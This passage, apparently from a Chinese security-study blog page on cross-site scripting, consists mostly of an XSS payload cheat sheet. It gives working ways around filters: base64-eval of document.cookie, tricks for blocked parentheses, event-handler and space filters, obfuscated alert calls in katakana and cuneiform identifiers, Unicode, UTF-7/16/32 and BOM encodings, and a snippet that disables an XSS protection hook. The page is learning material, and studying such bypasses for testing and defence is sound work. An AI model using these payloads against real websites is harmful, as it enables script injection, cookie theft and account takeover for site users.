+&lt;script&gt;eval(atob(&quot;YWxlcnQoZG9jdW1lbnQuY29va2llKQ==&quot;))&lt;script&gt;
+echo -n &quot;alert(document.cookie)&quot; | base64 编码为 YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
+</code></pre></div><h5 id="绕过字符串的括号"><a href="#绕过字符串的括号" class="header-anchor">#</a> 绕过字符串的括号</h5> <div class="language- extra-class"><pre><code>alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+</code></pre></div><h5 id="绕过括号和分号"><a href="#绕过括号和分号" class="header-anchor">#</a> 绕过括号和分号</h5> <div class="language- extra-class"><pre><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
+&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;
+
+&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]&lt;/script&gt;
+
+&lt;script&gt;TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']&lt;/script&gt;
+</code></pre></div><h5 id="绕过onxxxx-黑名单"><a href="#绕过onxxxx-黑名单" class="header-anchor">#</a> 绕过onxxxx=黑名单</h5> <div class="language- extra-class"><pre><code>&lt;object onafterscriptexecute=confirm(0)&gt;
+&lt;object onbeforescriptexecute=confirm(0)&gt;
+
+&lt;img src='1' onerror\x00=alert(0) /&gt;
+&lt;img src='1' onerror\x0b=alert(0) /&gt;
+
+&lt;img src='1' onerror/=alert(0) /&gt;
+</code></pre></div><h5 id="绕过空格过滤"><a href="#绕过空格过滤" class="header-anchor">#</a> 绕过空格过滤</h5> <div class="language- extra-class"><pre><code>// 使用 &quot;/&quot; 绕过
+&lt;img/src='1'/onerror=alert(0)&gt;
+
+// 使用0x0c/^L  绕过
+&lt;svgonload=alert(1)&gt;
+
+$ echo &quot;&lt;svg^Lonload^L=^Lalert(1)^L&gt;&quot; | xxd
+00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  &lt;svg.onload.=.al
+00000010: 6572 7428 3129 0c3e 0a                   ert(1).&gt;.
+</code></pre></div><h5 id="绕过电子邮件过滤"><a href="#绕过电子邮件过滤" class="header-anchor">#</a> 绕过电子邮件过滤</h5> <div class="language- extra-class"><pre><code>&quot;&gt;&lt;svg/onload=confirm(1)&gt;&quot;@x.y
+</code></pre></div><h5 id="绕过document黑名单"><a href="#绕过document黑名单" class="header-anchor">#</a> 绕过document黑名单</h5> <div class="language- extra-class"><pre><code>&lt;div id = &quot;x&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(x.parentNode.parentNode.parentNode.location)&lt;/script&gt;
+window[&quot;doc&quot;+&quot;ument&quot;]
+</code></pre></div><h5 id="在字符串中使用-javascript-绕过"><a href="#在字符串中使用-javascript-绕过" class="header-anchor">#</a> 在字符串中使用 javascript 绕过</h5> <div class="language- extra-class"><pre><code>&lt;script&gt;
+foo=&quot;text &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
+&lt;/script&gt;
+</code></pre></div><h5 id="重定向"><a href="#重定向" class="header-anchor">#</a> 重定向</h5> <div class="language- extra-class"><pre><code>location=&quot;http://google.com&quot;
+document.location = &quot;http://google.com&quot;
+document.location.href=&quot;http://google.com&quot;
+window.location.assign(&quot;http://google.com&quot;)
+window['location']['href']=&quot;http://google.com&quot;
+</code></pre></div><h5 id="其他方式的alert"><a href="#其他方式的alert" class="header-anchor">#</a> 其他方式的alert</h5> <div class="language- extra-class"><pre><code>window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+
+prompt`${document.domain}`
+document.location='java\tscript:alert(1)'
+document.location='java\rscript:alert(1)'
+document.location='java\tscript:alert(1)'
+
+eval('ale'+'rt(0)');
+Function(&quot;ale&quot;+&quot;rt(1)&quot;)();
+new Function`al\ert\`6\``;
+
+constructor.constructor(&quot;aler&quot;+&quot;t(3)&quot;)();
+[].filter.constructor('ale'+'rt(4)')();
+
+top[&quot;al&quot;+&quot;ert&quot;](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top['al\x65rt'](9);
+
+open('java'+'script:ale'+'rt(11)');
+location='javascript:ale'+'rt(12)';
+
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+
+var i = document.createElement(&quot;iframe&quot;);
+i.onload = function(){
+  i.contentWindow.alert(1);
+}
+document.appendChild(i);
+
+// Bypassed security
+XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
+      var proxy = obj[name];
+      obj[name] = function () {
+        if (exec_original) {
+          return proxy.apply(this, arguments);
+        }
+      };
+      XSSObject.lockdown(obj, name);
+  };
+XSSObject.proxy(window, 'alert', 'window.alert', false);
+</code></pre></div><h5 id=""><a href="#" class="header-anchor">#</a></h5> <div class="language- extra-class"><pre><code>&lt;svg onload=alert(1)//
+
+
+Unicode 字符 U+FF1C 和 U+FF1E
+
+
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' &gt; alert('&gt;') &gt; 'xt';
+'te' &lt; alert('&lt;') &lt; 'xt';
+'te' == alert('==') == 'xt';
+'te' &amp; alert('&amp;') &amp; 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
+</code></pre></div><h5 id="html-编码"><a href="#html-编码" class="header-anchor">#</a> HTML 编码</h5> <div class="language- extra-class"><pre><code>%26%2397;lert(1)
+&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;
+&gt;&lt;/script&gt;&lt;svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)&gt;
+</code></pre></div><h5 id="片假名库"><a href="#片假名库" class="header-anchor">#</a> 片假名库</h5> <div class="language- extra-class"><pre><code>https://github.com/aemkei/katakana.js
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+</code></pre></div><h5 id="楔形文字"><a href="#楔形文字" class="header-anchor">#</a> 楔形文字</h5> <div class="language- extra-class"><pre><code>𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+&quot;(𒀀)&quot;)()
+</code></pre></div><h5 id="lontara"><a href="#lontara" class="header-anchor">#</a> Lontara</h5> <div class="language- extra-class"><pre><code>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+&quot;(ᨆ)&quot;)()
+</code></pre></div><h5 id="ecmascript6"><a href="#ecmascript6" class="header-anchor">#</a> ECMAScript6</h5> <div class="language- extra-class"><pre><code>&lt;script&gt;alert&amp;DiacriticalGrave;1&amp;DiacriticalGrave;&lt;/script&gt;
+</code></pre></div><h5 id="unicode"><a href="#unicode" class="header-anchor">#</a> Unicode</h5> <div class="language- extra-class"><pre><code>Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
+transformed into U+003C LESS­THAN SIGN (&lt;)
+
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (&quot;)
+
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+
+E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
+%EF%BC%9E becomes &gt;
+%EF%BC%9C becomes &lt;
+
+绕过使用转换为大写的 Unicode
+İ (%c4%b0).toLowerCase() =&gt; i
+ı (%c4%b1).toUpperCase() =&gt; I
+ſ (%c5%bf) .toUpperCase() =&gt; S
+K (%E2%84%AA).toLowerCase() =&gt; k
+
+&lt;ſvg onload=... &gt; become &lt;SVG ONLOAD=...&gt;
+&lt;ıframe id=x onload=&gt;.toUpperCase() become &lt;IFRAME ID=X ONLOAD=&gt;
+</code></pre></div><h5 id="utf-7"><a href="#utf-7" class="header-anchor">#</a> UTF-7</h5> <div class="language- extra-class"><pre><code>+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+</code></pre></div><h5 id="utf-8"><a href="#utf-8" class="header-anchor">#</a> UTF-8</h5> <div class="language- extra-class"><pre><code>&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC
+&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+&quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+&quot; = %CA%BA
+' = %CA%B9
+</code></pre></div><h5 id="utf-16be"><a href="#utf-16be" class="header-anchor">#</a> UTF-16be</h5> <div class="language- extra-class"><pre><code>%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
+\x00&lt;\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00&gt;
+</code></pre></div><h5 id="utf-32"><a href="#utf-32" class="header-anchor">#</a> UTF-32</h5> <div class="language- extra-class"><pre><code>%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+</code></pre></div><h5 id="使用-bom-绕过"><a href="#使用-bom-绕过" class="header-anchor">#</a> 使用 BOM 绕过</h5> <div class="language- extra-class"><pre><code>字节顺序标记（页面必须以 BOM 字符开头。） BOM 字符允许您覆盖页面的字符集
+BOM Character for UTF-16 Encoding:
+Big Endian : 0xFE 0xFF
+Little Endian : 0xFF 0xFE
+XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+
+BOM Character for UTF-32 Encoding:
+Big Endian : 0x00 0x00 0xFE 0xFF
+Little Endian : 0xFF 0xFE 0x00 0x00
+XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+</code></pre></div><h5 id="奇怪的编码"><a href="#奇怪的编码" class="header-anchor">#</a> 奇怪的编码</h5> <div class="language- extra-class"><pre><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;
+&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;
+&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     &lt;/script&gt;
+</code></pre></div></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/s-dehua/s-dehua.github.io/edit/master/docs/05.网络安全/03.渗透测试服务访问/003.XSS.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2023/11/29, 10:31:15</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/a3a963/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">前端访问</div></a> <a href="/pages/520599/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">大模型驱动网络安全新未来</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/pages/a3a963/" class="prev">前端访问</a></span> <span class="next"><a href="/pages/520599/">大模型驱动网络安全新未来</a>→
+      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/1895e7/"><div>
+            TF119大模型驱动的数字生产力
+            <!----></div></a> <span class="date">12-14</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/520599/"><div>
+            大模型驱动网络安全新未来
+            <!----></div></a> <span class="date">12-14</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/c6b2f3/"><div>
+            云原生路线
+            <!----></div></a> <span class="date">12-14</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:sdhstart@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/s-dehua" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
+  Theme by
+  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
+    | Copyright © 2023-2023
+    <span>帅德华 | <a href="https://github.com/s-dehua/s-dehua.github.io" target="_blank">学习空间</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
+          跟随系统
+        </li><li class="iconfont icon-rijianmoshi">
+          浅色模式
+        </li><li class="iconfont icon-yejianmoshi">
+          深色模式
+        </li><li class="iconfont icon-yuedu">
+          阅读模式
+        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
+    <script src="/assets/js/app.07df95bb.js" defer></script><script src="/assets/js/2.599e1dc6.js" defer></script><script src="/assets/js/214.b8ffef7d.js" defer></script>
+  </body>
+</html>
